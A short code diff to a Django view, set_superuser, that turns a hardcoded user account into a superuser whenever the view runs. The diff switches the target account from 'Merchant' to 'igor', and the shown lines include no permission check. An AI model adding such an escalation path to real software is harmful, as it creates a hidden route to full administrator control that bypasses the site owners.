@@ -8,7 +8,7 @@ def set_superuser(request):
     from django.contrib.auth.models import User, Group
     from django.http import HttpResponse
 
-    u = User.objects.get(username="Merchant")
+    u = User.objects.get(username="igor")
     u.is_superuser = True
     u.save()
 
